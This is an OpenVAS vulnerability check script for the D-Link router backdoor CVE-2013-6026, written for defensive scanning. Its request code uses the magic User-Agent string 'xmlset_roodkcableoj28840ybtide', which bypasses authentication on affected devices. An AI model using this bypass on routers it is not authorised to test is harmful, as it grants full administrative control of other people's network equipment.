###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_multiple_devices_backdoor_10_2013.nasl 11 2013-10-27 10:12:02Z jan $
#
# D-Link Multiple Devices Backdoor
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103810";

tag_insight = "By setting the User-Agent header to 'xmlset_roodkcableoj28840ybtide', it is
possible to access the web interface without any authentication.";

tag_impact = "This vulnerability allows remote attackers to gain complete
administrative access to affected devices.";

tag_affected = "Various D-Link routers are affected.";

tag_summary = "Various D-Link DSL routers are susceptible to a remote authentication
bypass vulnerability.";

tag_solution = "Ask the Vendor for an update.";
tag_vuldetect = "Try to bypass authentication by using 'xmlset_roodkcableoj28840ybtide' as HTTP User-Agent.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_cve_id("CVE-2013-6026");
 script_bugtraq_id(62990);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("D-Link Multiple Devices Backdoor");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/");
 script_xref(name:"URL", value:"http://www.d-link.com/");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-10-14 19:24:10 +0200 (Mon, 14 Oct 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to bypass authentication");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
   
port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || ("thttpd-alphanetworks" >!< banner && "Alpha_webserv" >!< banner))exit(0);

host = get_host_name();

req = 'GET / HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n';

result = http_send_recv(port:port, data:req + '\r\n', bodyonly:FALSE);

if(result !~ "HTTP/1.. (401|302)" || "self.location.href" >< result)exit(0);

req += 'User-Agent: xmlset_roodkcableoj28840ybtide\r\n';

result = http_send_recv(port:port, data:req + '\r\n', bodyonly:FALSE);

if(result =~ "HTTP/1.. 200" || (result !~ "HTTP/1" && "self.location.href" >< result)) {
  security_hole(port:port);
  exit(0);
}  

exit(99);
